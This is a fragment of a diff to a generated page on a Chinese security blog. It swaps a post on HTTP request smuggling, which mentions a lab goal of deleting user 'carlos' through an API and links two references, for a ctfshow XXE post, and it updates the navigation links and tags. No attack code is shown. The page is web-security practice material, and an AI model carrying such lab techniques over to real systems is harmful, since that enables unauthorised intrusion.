-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205213236-fsv0r85.png" alt="image"></p>
-<p>题目要求将 carlos 删除，访问对应 api 就行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250827163634-20260228215036-ar8xvi7.png" alt="image"></p>
 <p>‍</p>
-<p>‍</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7097">浅谈HTTP请求走私-先知社区</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#54-xss">协议层的攻击——HTTP请求走私</a></p>
 
                 
             </div>
@@ -601,7 +578,7 @@ x&#x3D;1</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wwwmarin.xyz/2025/12/05/http-qing-qiu-zou-si/">https://wwwmarin.xyz/2025/12/05/http-qing-qiu-zou-si/</a>
+                    <a href="https://wwwmarin.xyz/2025/08/27/ctfshow-xxe/">https://wwwmarin.xyz/2025/08/27/ctfshow-xxe/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -643,8 +620,8 @@ x&#x3D;1</code></pre>
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">漏洞</span>
+                                <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                    <span class="chip bg-color">刷题</span>
                                 </a>
                             
                         </div>
@@ -727,12 +704,12 @@ x&#x3D;1</code></pre>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/12/05/ssti/">
+                <a href="/2025/09/05/jndi-zhu-ru/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/15212263_95842155_p0.jpg" class="responsive-img" alt="SSTI">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/6sy0rziperl34psjub73jhxi0.jpg" class="responsive-img" alt="JNDI 注入">
                         
-                        <span class="card-title">SSTI</span>
+                        <span class="card-title">JNDI 注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -743,7 +720,7 @@ x&#x3D;1</code></pre>
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-12-05
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-09-05
                         </span>
                         <span class="publish-author">
                             
@@ -764,8 +741,8 @@ x&#x3D;1</code></pre>
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
                     </a>
                     
                 </div>
@@ -779,12 +756,12 @@ x&#x3D;1</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/12/05/xxe/">
+                <a href="/2025/08/27/hackthebox/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_123907.jpg" class="responsive-img" alt="XXE">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/fdd81ab4e06b3b576916484ce1da2b81.jpg" class="responsive-img" alt="Hackthebox">
                         
-                        <span class="card-title">XXE</span>
+                        <span class="card-title">Hackthebox</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -795,7 +772,7 @@ x&#x3D;1</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-08-27
                             </span>
                         <span class="publish-author">
                             
@@ -816,8 +793,8 @@ x&#x3D;1</code></pre>
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
                     </a>
                     
                 </div>
